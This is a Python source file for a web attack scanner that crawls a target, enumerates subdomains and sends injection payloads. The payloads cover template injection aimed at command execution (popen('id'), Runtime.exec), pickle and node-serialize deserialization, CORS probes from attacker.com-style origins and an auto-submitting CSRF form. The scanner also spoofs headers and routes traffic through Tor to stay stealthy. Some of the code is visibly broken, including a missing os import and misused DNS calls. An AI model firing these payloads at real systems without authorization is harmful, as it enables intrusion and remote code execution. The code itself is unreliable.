import asyncio
import aiohttp
import argparse
from urllib.parse import urljoin, urlparse, quote
from bs4 import BeautifulSoup
from rich.console import Console
from rich.table import Table
from rich.progress import track
from rich.markdown import Markdown
import yaml
import json
import signal
import jwt
import re
import hashlib
import random
import string
from cryptography.fernet import Fernet
from typing import Dict, List, Optional, AsyncGenerator
import xml.etree.ElementTree as ET
import dns.resolver
import tldextract
from faker import Faker
from aiohttp_socks import ProxyConnector
import numpy as np
from sklearn.ensemble import IsolationForest
from binary_detection import BinaryDetector
from base_scanner import BaseScanner
from threat_intelligence import ThreatIntelligence
from ai_anomaly_detector import AIAnomalyDetector

# Initialize rich console
console = Console()

# Advanced configuration
VERSION = "1.5.0"
BANNER = f"""
[bold gradient(45,red,purple)]

     █████╗ ██╗    ██╗███████╗
    ██╔══██╗██║    ██║██╔════╝
    ███████║██║ █╗ ██║███████╗
    ██╔══██║██║███╗██║╚════██║
    ██║  ██║╚███╔███╔╝███████║
    ╚═╝  ╚═╝ ╚══╝╚══╝ ╚══════╝
[/bold gradient(45,red,purple)] Version: {VERSION} | Web Security Scanner
[bold blue] BY: 0xdowz | GitHub: https://github.com/0xdowz [/bold blue]
"""

class AdvancedScanner(BaseScanner, ThreatIntelligence, AIAnomalyDetector):
    def __init__(self, config: Dict):
        BaseScanner.__init__(self, config)
        ThreatIntelligence.__init__(self)
        AIAnomalyDetector.__init__(self)
        self.config = config
        self.session = None
        self.lock = asyncio.Lock()
        self.discovered_urls = set()
        self.vulnerabilities = []
        self.crypto = Fernet(config['encryption_key'])
        self.faker = Faker()
        self.payloads = self.load_payloads()
        self.request_count = 0
        self.rate_limit_sem = asyncio.Semaphore(50)
        self.binary_detector = BinaryDetector()
        self.scan_stats = {
            'total_urls': 0,
            'binary_files': 0,
            'vulnerabilities': 0,
            'scan_duration': 0
        }

    def _generate_headers(self):
        """Generate randomized headers for stealth"""
        return {
            'User-Agent': self.faker.user_agent(),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': f'en-US,en;q=0.{random.randint(5,9)}',
            'X-Forwarded-For': self.faker.ipv4(),
            'Referer': self.faker.url()
        }

    async def crawl(self, url: str):
        """Crawl the target URL and discover endpoints with binary file detection"""
        try:
            # Validate and normalize URL
            if not url.startswith(('http://', 'https://')):
                url = f'http://{url}'
                console.print(f"[yellow]No protocol specified, using: {url}[/yellow]")
            
            # Parse URL to validate format
            parsed_url = urlparse(url)
            if not all([parsed_url.scheme, parsed_url.netloc]):
                console.print(f"[red]Invalid URL format: {url}[/red]")
                return

            # Check if URL points to an image file
            image_extensions = ('.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp', '.svg', '.ico')
            if url.lower().endswith(image_extensions):
                console.print(f"[yellow]Skipping image file: {url}[/yellow]")
                return

            console.print(f"[cyan]Starting crawl of {url}...[/cyan]")
            async with self.session.get(url, allow_redirects=True) as resp:
                if resp.status == 404:
                    console.print(f"[red]Error: Page not found (404) at {url}[/red]")
                    console.print("[yellow]Try checking if the URL is correct or if the page has been moved.[/yellow]")
                    return
                elif resp.status == 403:
                    console.print(f"[red]Error: Access forbidden (403) at {url}[/red]")
                    console.print("[yellow]The server is refusing to authorize this request.[/yellow]")
                    return
                elif resp.status == 200:
                    # Check content type for images
                    content_type = resp.headers.get('content-type', '').lower()
                    if content_type.startswith('image/'):
                        console.print(f"[yellow]Skipping image content: {url}[/yellow]")
                        return

                    # Check if response is a binary file
                    if 'application/octet-stream' in content_type or 'application/x-executable' in content_type:
                        self.scan_stats['binary_files'] += 1
                        analysis = await self._analyze_binary_response(url, await resp.read())
                        if analysis['risks']:
                            self.vulnerabilities.append({
                                'type': 'Binary File Risk',
                                'severity': 'high',
                                'url': url,
                                'details': f"Binary file detected with risks: {', '.join(r['description'] for r in analysis['risks'])}"
                            })
                        return

                    text = await resp.text()
                    soup = BeautifulSoup(text, 'html.parser')
                    
                    # Extract all links
                    for link in soup.find_all(['a', 'link', 'script', 'img', 'form']):
                        href = link.get('href') or link.get('src') or link.get('action')
                        if href:
                            try:
                                full_url = urljoin(url, href)
                                # Skip if the URL is an image
                                if full_url.lower().endswith(image_extensions):
                                    continue
                                parsed = urlparse(full_url)
                                if parsed.netloc == parsed_url.netloc:  # Better domain matching
                                    self.discovered_urls.add(full_url)
                                    self.scan_stats['total_urls'] += 1
                                    console.print(f"[green]Found endpoint: {full_url}[/green]")
                            except Exception as e:
                                console.print(f"[yellow]Error processing URL {href}: {str(e)}[/yellow]")
                    
                    if not self.discovered_urls:
                        console.print("[yellow]Warning: No endpoints discovered. The target might be blocking crawling attempts.[/yellow]")
                    else:
                        console.print(f"[green]Successfully discovered {len(self.discovered_urls)} endpoints[/green]")
                else:
                    console.print(f"[red]Error: Received status code {resp.status} from {url}[/red]")
                    console.print("[yellow]The server returned an unexpected response.[/yellow]")
        except aiohttp.ClientError as e:
            console.print(f"[red]Network error while crawling {url}: {str(e)}[/red]")
            console.print("[yellow]Check your internet connection and try again.[/yellow]")
        except Exception as e:
            console.print(f"[red]Unexpected error crawling {url}: {str(e)}[/red]")
            return

    async def _analyze_binary_response(self, url: str, content: bytes) -> Dict:
        """Analyze binary content from response"""
        temp_path = f"temp_binary_{hashlib.md5(url.encode()).hexdigest()}"
        try:
            with open(temp_path, 'wb') as f:
                f.write(content)
            analysis = self.binary_detector.analyze_binary(temp_path)
            return analysis
        finally:
            if os.path.exists(temp_path):
                os.remove(temp_path)

    async def close(self):
        """Close the HTTP session and cleanup resources"""
        if self.session:
            await self.session.close()
        
    def load_payloads(self):
        """Load payloads from YAML file"""
        try:
            with open(self.config['payloads_file'], 'r') as f:
                return yaml.safe_load(f)
        except Exception as e:
            console.print(f"[red]Error loading payloads: {str(e)}[/red]")
            return {}

    async def init_session(self):
        """Initialize HTTP session with advanced configuration"""
        if self.config.get('tor'):
            connector = ProxyConnector.from_url('socks5://127.0.0.1:9050')
        else:
            connector = aiohttp.TCPConnector(limit=100, ssl=False)

        self.session = aiohttp.ClientSession(
            connector=connector,
            headers=self._generate_headers(),
            timeout=aiohttp.ClientTimeout(total=30),
            cookie_jar=aiohttp.CookieJar(unsafe=True)
        )

        # Load threat intelligence data
        try:
            await self.load_threat_feeds()
            stats = self.get_threat_stats()
            console.print(f"[green]Loaded {stats['total_malicious_ips']} malicious IPs from {stats['feeds_loaded']} feeds[/green]")
        except Exception as e:
            console.print(f"[yellow]Warning: Could not load threat feeds. Error: {str(e)}[/yellow]")

        return self.session

    async def generate_report(self, format: str):
        """Generate scan report in specified format"""
        if not hasattr(self, 'vulnerabilities'):
            self.vulnerabilities = []

        if format == 'html':
            report = self._generate_html_report()
            with open('scan_report.html', 'w') as f:
                f.write(report)
        elif format == 'json':
            report = self._generate_json_report()
            with open('scan_report.json', 'w') as f:
                json.dump(report, f, indent=2)
        elif format == 'md':
            report = self._generate_markdown_report()
            with open('scan_report.md', 'w') as f:
                f.write(report)
        elif format == 'sarif':
            report = self._generate_sarif_report()
            with open('scan_report.sarif', 'w') as f:
                json.dump(report, f, indent=2)

        console.print(f"\n[green]Report generated successfully: scan_report.{format}[/green]")

    def _generate_html_report(self) -> str:
        """Generate HTML format report"""
        html = f"""<!DOCTYPE html>
<html>
<head>
    <title>Security Scan Report</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 40px; }}
        h1 {{ color: #2c3e50; }}
        .vulnerability {{ border: 1px solid #ddd; padding: 15px; margin: 10px 0; border-radius: 5px; }}
        .high {{ border-left: 5px solid #e74c3c; }}
        .medium {{ border-left: 5px solid #f39c12; }}
        .low {{ border-left: 5px solid #3498db; }}
    </style>
</head>
<body>
    <h1>Security Scan Report</h1>
    <h2>Target: {self.config['target']}</h2>
    <h3>Scan Statistics</h3>
    <ul>
        <li>Total URLs Discovered: {len(self.discovered_urls)}</li>
        <li>Total Vulnerabilities: {len(self.vulnerabilities)}</li>
        <li>Total Requests: {self.request_count}</li>
    </ul>
    <h3>Vulnerabilities</h3>"""

        for vuln in self.vulnerabilities:
            severity = self._determine_severity(vuln['type'])
            html += f"""
    <div class="vulnerability {severity.lower()}">
        <h4>{vuln['type']}</h4>
        <p><strong>URL:</strong> {vuln['url']}</p>
        <p><strong>Payload:</strong> {vuln['payload']}</p>
        <p><strong>Details:</strong> {vuln['details']}</p>
    </div>"""

        html += "\n</body>\n</html>"
        return html

    def _generate_json_report(self) -> dict:
        """Generate JSON format report"""
        return {
            'target': self.config['target'],
            'scan_stats': {
                'urls_discovered': len(self.discovered_urls),
                'total_vulnerabilities': len(self.vulnerabilities),
                'total_requests': self.request_count
            },
            'vulnerabilities': self.vulnerabilities,
            'discovered_urls': list(self.discovered_urls)
        }

    def _generate_markdown_report(self) -> str:
        """Generate Markdown format report"""
        md = f"""# Security Scan Report

## Target: {self.config['target']}

### Scan Statistics
- Total URLs Discovered: {len(self.discovered_urls)}
- Total Vulnerabilities: {len(self.vulnerabilities)}
- Total Requests: {self.request_count}

### Vulnerabilities
"""

        for vuln in self.vulnerabilities:
            md += f"""
#### {vuln['type']}
- **URL:** {vuln['url']}
- **Payload:** {vuln['payload']}
- **Details:** {vuln['details']}
"""

        return md

    def _generate_sarif_report(self) -> dict:
        """Generate SARIF format report"""
        return {
            "$schema": "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/master/Schemata/sarif-schema-2.1.0.json",
            "version": "2.1.0",
            "runs": [{
                "tool": {
                    "driver": {
                        "name": "AWS Enterprise Scanner",
                        "version": VERSION,
                        "rules": self._generate_sarif_rules()
                    }
                },
                "results": [self._convert_to_sarif_result(v) for v in self.vulnerabilities]
            }]
        }

    def _determine_severity(self, vuln_type: str) -> str:
        """Determine vulnerability severity"""
        high_severity = ['RCE', 'SQLi', 'XXE', 'SSRF']
        medium_severity = ['XSS', 'CSRF', 'SSTI', 'Deserialization']
        
        if vuln_type in high_severity:
            return 'HIGH'
        elif vuln_type in medium_severity:
            return 'MEDIUM'
        return 'LOW'

    def _generate_sarif_rules(self) -> list:
        """Generate SARIF rules from vulnerabilities"""
        rules = []
        seen_types = set()

        for vuln in self.vulnerabilities:
            if vuln['type'] not in seen_types:
                seen_types.add(vuln['type'])
                rules.append({
                    "id": vuln['type'].lower().replace(' ', '_'),
                    "name": vuln['type'],
                    "shortDescription": {
                        "text": f"Detect {vuln['type']} vulnerabilities"
                    },
                    "defaultConfiguration": {
                        "level": self._determine_severity(vuln['type']).lower()
                    }
                })
        return rules

    def _convert_to_sarif_result(self, vuln: dict) -> dict:
        """Convert vulnerability to SARIF result format"""
        return {
            "ruleId": vuln['type'].lower().replace(' ', '_'),
            "level": self._determine_severity(vuln['type']).lower(),
            "message": {
                "text": vuln['details']
            },
            "locations": [{
                "physicalLocation": {
                    "artifactLocation": {
                        "uri": vuln['url']
                    }
                }
            }]
        }

    async def report_vulnerability(self, vuln_type: str, url: str, payload: str, details: str):
        """Report a discovered vulnerability"""
        self.vulnerabilities.append({
            'type': vuln_type,
            'url': url,
            'payload': payload,
            'details': details
        })
        console.print(f"[red][!] Found {vuln_type} vulnerability at {url}[/red]")

    async def dns_enumerate(self, domain: str):
        """Perform DNS enumeration for subdomains and related records"""
        try:
            extracted = tldextract.extract(domain)
            base_domain = f"{extracted.domain}.{extracted.suffix}"
            
            # Check DNS records
            record_types = ['A', 'AAAA', 'MX', 'TXT', 'CNAME']
            for rtype in record_types:
                answers = dns.resolver.resolve(base_domain, rtype, raise_on_no_answer=False)
                for rdata in answers:
                    console.print(f"[DNS] {rtype} Record: {rdata.to_text()}", style="dim blue")

            # Subdomain brute-forcing
            with open('subdomains.txt') as f:
                subdomains = [s.strip() for s in f.read().splitlines() if s.strip()]
                
            for sub in subdomains:
                if not sub:  # Skip empty subdomains
                    continue
                target = f"{sub}.{base_domain}"
                try:
                    answers = await dns.resolver.resolve(target, 'A')
                    console.print(f"[DNS] Found subdomain: {target}", style="green")
                    self.discovered_urls.add(f"http://{target}")
                except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer, dns.name.EmptyLabel):
                    continue
                except Exception as e:
                    console.print(f"[DNS] Error resolving {target}: {str(e)}", style="yellow")
                    continue

        except Exception as e:
            console.print(f"[!] DNS Enum error: {str(e)}", style="bold red")

    async def check_cors(self, url: str):
        """Check for CORS misconfigurations with enhanced detection"""
        malicious_origins = [
            "https://attacker.com",
            "null",
            "https://evil.com",
            f"https://{self.faker.domain_name()}"
        ]
        
        try:
            for origin in malicious_origins:
                headers = {"Origin": origin}
                async with self.session.options(url, headers=headers, timeout=10) as resp:
                    acao = resp.headers.get('Access-Control-Allow-Origin', '')
                    acac = resp.headers.get('Access-Control-Allow-Credentials', '')
                    acam = resp.headers.get('Access-Control-Allow-Methods', '')
                    
                    # Check for various CORS misconfigurations
                    if any([
                        acao == '*' and acac == 'true',  # Wildcard with credentials
                        origin != '*' and origin in acao,  # Origin reflection
                        acao.startswith(origin.split('://')[1]),  # Weak origin validation
                        'null' in acao.lower()  # Null origin allowed
                    ]):
                        await self.report_vulnerability(
                            'CORS Misconfiguration',
                            url,
                            origin,
                            f"Vulnerable CORS configuration detected:\n" \
                            f"Access-Control-Allow-Origin: {acao}\n" \
                            f"Access-Control-Allow-Credentials: {acac}\n" \
                            f"Access-Control-Allow-Methods: {acam}"
                        )
                        break  # Found a vulnerability, no need to test more origins
                
                await asyncio.sleep(0.5)  # Rate limiting between requests
                
        except asyncio.TimeoutError:
            console.print(f"[yellow]CORS check timeout for {url}[/yellow]")
        except aiohttp.ClientError as e:
            console.print(f"[yellow]CORS check network error for {url}: {str(e)}[/yellow]")
        except Exception as e:
            console.print(f"[red]CORS check error for {url}: {str(e)}[/red]")

    async def test_ssti(self, url: str):
        """Test for Server-Side Template Injection with enhanced detection capabilities"""
        console.print(f"[cyan]Testing SSTI vulnerabilities on {url}...[/cyan]")
        
        # Enhanced SSTI test payloads with more template engines and improved markers
        test_payloads = [
            # Jinja2 (Python)
            {'name': 'Jinja2-Basic', 'payload': '{{7*7}}', 'marker': '49', 'context': 'math'},
            {'name': 'Jinja2-Object', 'payload': '{{self}}', 'marker': 'object', 'context': 'object'},
            {'name': 'Jinja2-Advanced', 'payload': '{{config.__class__.__init__.__globals__["os"].popen("echo test").read()}}', 'marker': 'test', 'context': 'rce'},
            {'name': 'Jinja2-Attributes', 'payload': '{{request.application.__globals__.__builtins__.__import__("os").popen("id").read()}}', 'marker': 'uid=', 'context': 'rce'},
            
            # Twig (PHP)
            {'name': 'Twig-Basic', 'payload': '${7*7}', 'marker': '49', 'context': 'math'},
            {'name': 'Twig-Advanced', 'payload': '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}', 'marker': 'uid=', 'context': 'rce'},
            {'name': 'Twig-Code', 'payload': '{% for key, value in _context %} {{key}} {% endfor %}', 'marker': '_context', 'context': 'info'},
            
            # FreeMarker (Java)
            {'name': 'FreeMarker-Basic', 'payload': '#{7*7}', 'marker': '49', 'context': 'math'},
            {'name': 'FreeMarker-Advanced', 'payload': '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}', 'marker': 'uid=', 'context': 'rce'},
            {'name': 'FreeMarker-Object', 'payload': '${object}', 'marker': 'object', 'context': 'object'},
            
            # Expression Language (Java)
            {'name': 'EL-Basic', 'payload': '${7*7}', 'marker': '49', 'context': 'math'},
            {'name': 'EL-Advanced', 'payload': '${T(java.lang.Runtime).getRuntime().exec("echo test")}', 'marker': 'test', 'context': 'rce'},
            
            # Velocity (Java)
            {'name': 'Velocity-Basic', 'payload': '#set($x=1+1)${x}', 'marker': '2', 'context': 'math'},
            {'name': 'Velocity-Advanced', 'payload': '#set($e="e")${@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("id").getInputStream())}', 'marker': 'uid=', 'context': 'rce'},
            
            # Handlebars (JavaScript)
            {'name': 'Handlebars', 'payload': '{{#with "s" as |string|}}{{{string.sub.apply 0 "constructor"}}}{{{string.sub.apply 0 "constructor" "alert(`xss`)"}}}{{/with}}', 'marker': 'function', 'context': 'js'},
            
            # Smarty (PHP)
            {'name': 'Smarty', 'payload': '{php}echo `id`;{/php}', 'marker': 'uid=', 'context': 'rce'},
            {'name': 'Smarty-Math', 'payload': '{$smarty.math equation="7*7"}', 'marker': '49', 'context': 'math'},
            
            # Pebble (Java)
            {'name': 'Pebble', 'payload': '{% for key, value in _context %} {{key}} {% endfor %}', 'marker': '_context', 'context': 'info'},
            {'name': 'Pebble-Advanced', 'payload': '{{ variable.getClass().forName("java.lang.Runtime").getRuntime().exec("id") }}', 'marker': 'uid=', 'context': 'rce'}
        ]
        
        # Enhanced error patterns for better detection
        error_patterns = [
            'exception', 'error', 'syntax error', 'undefined', 'unexpected', 'not found',
            'cannot be accessed', 'illegal', 'invalid', 'compilation failed', 'parse error',
            'runtime error', 'not allowed', 'security exception', 'access denied',
            'template error', 'evaluation failed', 'execution error', 'not supported'
        ]
        
        # Additional parameter names to test
        param_names = ['input', 'template', 'view', 'page', 'file', 'theme', 'layout', 'id', 'name', 'data', 'query']
        
        for payload in test_payloads:
            try:
                async with self.rate_limit_sem:
                    # Test multiple GET parameters
                    for param in param_names:
                        params = {param: payload['payload']}
                        async with self.session.get(url, params=params) as resp:
                            text = await resp.text()
                            if payload['marker'] in text or any(error_pattern in text.lower() for error_pattern in error_patterns):
                                await self.report_vulnerability(
                                    'SSTI',
                                    url,
                                    payload['payload'],
                                    f"Detected {payload['name']} template injection via GET parameter '{param}'"
                                )
                                # Break after finding a vulnerability to avoid excessive testing
                                break
                    
                    # Test POST parameters with different content types
                    content_types = [
                        'application/x-www-form-urlencoded',
                        'application/json',
                        'text/plain'
                    ]
                    
                    for content_type in content_types:
                        for param in param_names:
                            if content_type == 'application/json':
                                data = {param: payload['payload']}
                                headers = {'Content-Type': content_type}
                                async with self.session.post(url, json=data, headers=headers) as resp:
                                    text = await resp.text()
                                    if payload['marker'] in text or any(error_pattern in text.lower() for error_pattern in error_patterns):
                                        await self.report_vulnerability(
                                            'SSTI',
                                            url,
                                            payload['payload'],
                                            f"Detected {payload['name']} template injection via POST JSON parameter '{param}'"
                                        )
                                        break
                            else:
                                data = {param: payload['payload']}
                                headers = {'Content-Type': content_type}
                                async with self.session.post(url, data=data, headers=headers) as resp:
                                    text = await resp.text()
                                    if payload['marker'] in text or any(error_pattern in text.lower() for error_pattern in error_patterns):
                                        await self.report_vulnerability(
                                            'SSTI',
                                            url,
                                            payload['payload'],
                                            f"Detected {payload['name']} template injection via POST parameter '{param}'"
                                        )
                                        break
                    
                    # Test headers with context-aware payloads
                    if payload['context'] in ['math', 'rce']:  # Only test certain payloads in headers
                        headers = {
                            'User-Agent': payload['payload'],
                            'Referer': payload['payload'],
                            'X-Forwarded-For': payload['payload'],
                            'Cookie': f'template={payload["payload"]}'
                        }
                        async with self.session.get(url, headers=headers) as resp:
                            text = await resp.text()
                            if payload['marker'] in text or any(error_pattern in text.lower() for error_pattern in error_patterns):
                                await self.report_vulnerability(
                                    'SSTI',
                                    url,
                                    payload['payload'],
                                    f"Detected {payload['name']} template injection via headers"
                                )
            except aiohttp.ClientError as e:
                console.print(f"[yellow]Network error testing SSTI on {url}: {str(e)}[/yellow]")
            except Exception as e:
                console.print(f"[red]Error testing SSTI on {url}: {str(e)}[/red]")

    async def check_deserialization(self, url: str):
        """Test for insecure deserialization vulnerabilities"""
        console.print(f"[cyan]Testing deserialization vulnerabilities on {url}...[/cyan]")
        
        # Common deserialization payloads
        test_payloads = [
            {
                'name': 'Java',
                'payload': {
                    'object': {
                        '$type': 'java.lang.Runtime',
                        'exec': 'whoami'
                    }
                },
                'marker': 'java.io.Serializable',
                'error_patterns': ['ClassNotFoundException', 'java.lang.Runtime']
            },
            {
                'name': '.NET',
                'payload': {
                    'objectType': 'System.IO.FileInfo, System.IO',
                    'path': 'C:\\Windows\\win.ini'
                },
                'marker': 'System.IO',
                'error_patterns': ['SerializationException', 'System.IO.FileInfo']
            },
            {
                'name': 'PHP',
                'payload': 'O:8:"stdClass":1:{s:4:"test";s:4:"test";}',
                'marker': 'stdClass',
                'error_patterns': ['unserialize', '__PHP_Incomplete_Class']
            },
            {
                'name': 'Python-Pickle',
                'payload': 'cos\nsystem\n(S\'id\'\ntR.',
                'marker': 'uid=',
                'error_patterns': ['pickle.', 'unmarshalling']
            },
            {
                'name': 'Ruby-Marshal',
                'payload': '\x04\x08o:\x0BKernel\x06:\x06@\x00',
                'marker': 'BasicObject',
                'error_patterns': ['Marshal.load', 'undefined class']
            },
            {
                'name': 'Node-serialize',
                'payload': '_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'id\')}()',
                'marker': 'uid=',
                'error_patterns': ['unexpected token', 'function']
            }
        ]
        
        for payload in test_payloads:
            try:
                async with self.rate_limit_sem:
                    headers = {'Content-Type': 'application/json'}
                    async with self.session.post(url, json=payload['payload'], headers=headers) as resp:
                        text = await resp.text()
                        if payload['marker'] in text:
                            await self.report_vulnerability(
                                'Insecure Deserialization',
                                url,
                                str(payload['payload']),
                                f"Detected {payload['name']} deserialization vulnerability"
                            )
                        
                    # Try with different content types
                    content_types = [
                        'application/x-java-serialized-object',
                        'application/x-www-form-urlencoded',
                        'application/xml'
                    ]
                    
                    for content_type in content_types:
                        headers = {'Content-Type': content_type}
                        async with self.session.post(url, data=str(payload['payload']), headers=headers) as resp:
                            text = await resp.text()
                            if payload['marker'] in text:
                                await self.report_vulnerability(
                                    'Insecure Deserialization',
                                    url,
                                    str(payload['payload']),
                                    f"Detected {payload['name']} deserialization vulnerability with {content_type}"
                                )
            except aiohttp.ClientError as e:
                console.print(f"[yellow]Network error testing deserialization on {url}: {str(e)}[/yellow]")
            except Exception as e:
                console.print(f"[red]Error testing deserialization on {url}: {str(e)}[/red]")

    async def check_graphql(self, url: str):
        """Check for GraphQL-specific vulnerabilities"""
        introspection_query = {
            "query": "{__schema{types{name fields{name args{name description} description}}}"
        }
        
        try:
            async with self.session.post(url, json=introspection_query) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    if '__schema' in data.get('data', {}):
                        await self.report_vulnerability(
                            'GraphQL Introspection Enabled',
                            url,
                            str(introspection_query),
                            "GraphQL introspection endpoint exposed"
                        )
        except Exception as e:
            console.print(f"[!] GraphQL check error: {str(e)}", style="bold red")

    def _generate_csrf_payload(self, action: str) -> str:
        """Generate CSRF payload with random tokens"""
        token = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
        return f"""
        <form action="{action}" method="POST" id="csrf">
            <input type="hidden" name="username" value="hacker">
            <input type="hidden" name="password" value="p@ssw0rd">
            <input type="hidden" name="csrf_token" value="{token}">
        </form>
        <script>document.getElementById('csrf').submit();</script>
        """

    async def check_dom_based_xss(self, url: str):
        """Check for DOM-based XSS using headless browser"""
        from playwright.async_api import async_playwright
        
        async with async_playwright() as p:
            browser = await p.chromium.launch()
            page = await browser.new_page()
            await page.goto(url)
            
            # Test common DOM XSS sinks
            sinks = [
                "document.write",
                "innerHTML",
                "eval",
                "setTimeout",
                "location.hash"
            ]
            
            for sink in sinks:
                payload = f"javascript:alert('XSS_{sink}')"
                try:
                    await page.evaluate(f"{sink}('{payload}')")
                    if await page.evaluate("typeof alert !== 'undefined'"):
                        await self.report_vulnerability(
                            'DOM-based XSS',
                            url,
                            payload,
                            f"Triggered via {sink}"
                        )
                except:
                    continue
            
            await browser.close()

async def show_menu():
    """Display interactive menu for scan options"""
    console.print(BANNER)
    console.print("\n[bold cyan]Select Scanning Option:[/bold cyan]")
    
    menu_table = Table(show_header=False, box=None)
    menu_table.add_row("[bold green]1.[/bold green]", "Full Vulnerability Scan")
    menu_table.add_row("[bold green]2.[/bold green]", "Payload Testing Only")
    menu_table.add_row("[bold green]3.[/bold green]", "Reconnaissance Only")
    menu_table.add_row("[bold green]4.[/bold green]", "Exit")
    menu_table.add_row("[bold green]5.[/bold green]", "Help")
    
    console.print(menu_table)
    
    while True:
        choice = console.input("\n[bold yellow]Enter your choice (1-5): [/bold yellow]")
        if choice == '5':
            show_help()
            # Redisplay menu after returning from help
            console.print("\n[bold cyan]Select Scanning Option:[/bold cyan]")
            console.print(menu_table)
            continue
        if choice in ['1', '2', '3', '4']:
            return int(choice)
        console.print("[red]Invalid choice. Please try again.[/red]")

def show_help():
    """Display help information and usage guide"""
    help_text = """
[bold cyan]AWS Enterprise Scanner Help[/bold cyan]

[bold]Available Commands:[/bold]
- python scanner.py <target_url> [options]
- awsscn.bat <target_url> [options]

[bold]Command Options:[/bold]
- -t, --target: Target URL or domain to scan
- --tor: Use Tor network for anonymous scanning
- -o, --output: Report format (html, json, md, sarif)
- -e, --evasion: Enable evasion techniques

[bold]Scanning Modes:[/bold]
1. Full Vulnerability Scan
   - Complete security assessment
   - Includes all available tests
   - CORS, SSTI, Deserialization checks
   - GraphQL endpoint testing
   - DOM-based XSS detection

2. Payload Testing Only
   - Focused testing with predefined payloads
   - SSTI and deserialization checks
   - Custom payload support

3. Reconnaissance Only
   - DNS enumeration
   - URL discovery and mapping
   - Subdomain scanning
   - Technology fingerprinting

[bold]Security Features:[/bold]
- Tor network support for anonymous scanning
- Rate limiting protection
- Evasion techniques
- Multiple report formats

[bold]Author:[/bold]
- Created by: 0xdowz
- GitHub: https://github.com/0xdowz

Press Enter to return to main menu...
    """
    console.clear()
    console.print(help_text)
    console.input("")
    console.clear()
    console.print(BANNER)


async def main():
    parser = argparse.ArgumentParser(description='AWS Enterprise Security Scanner')
    parser.add_argument('-t', '--target', help='Target URL or domain')
    parser.add_argument('--tor', action='store_true', help='Use Tor for anonymity')
    parser.add_argument('-o', '--output', choices=['html', 'json', 'md', 'sarif'], default='html', help='Report output format')
    args = parser.parse_args()

    config = {
        'target': args.target,
        'tor': args.tor,
        'encryption_key': Fernet.generate_key(),
        'payloads_file': 'advanced_payloads.yaml'
    }

    choice = await show_menu()
    
    if choice == 4:
        console.print("[yellow]Exiting...[/yellow]")
        return

    if not args.target:
        args.target = console.input("[bold cyan]Enter target URL or domain: [/bold cyan]")
        config['target'] = args.target

    scanner = AdvancedScanner(config)
    await scanner.init_session()

    try:
        if choice == 1:
            # Full Vulnerability Scan
            await scanner.crawl(args.target)
            for url in scanner.discovered_urls:
                await scanner.check_cors(url)
                await scanner.test_ssti(url)
                await scanner.check_deserialization(url)
                await scanner.check_graphql(url)
                await scanner.check_dom_based_xss(url)
        elif choice == 2:
            # Payload Testing Only
            await scanner.crawl(args.target)
            for url in scanner.discovered_urls:
                await scanner.test_ssti(url)
                await scanner.check_deserialization(url)
        elif choice == 3:
            # Reconnaissance Only
            await scanner.dns_enumerate(args.target)
            await scanner.crawl(args.target)

        # Always generate report after scan
        await scanner.generate_report(args.output)
        console.print("\n[green]Scan completed! Check the generated report for details.[/green]")

    except KeyboardInterrupt:
        console.print("\n[yellow]Scan interrupted by user[/yellow]")
    finally:
        await scanner.close()

if __name__ == '__main__':
    asyncio.run(main())
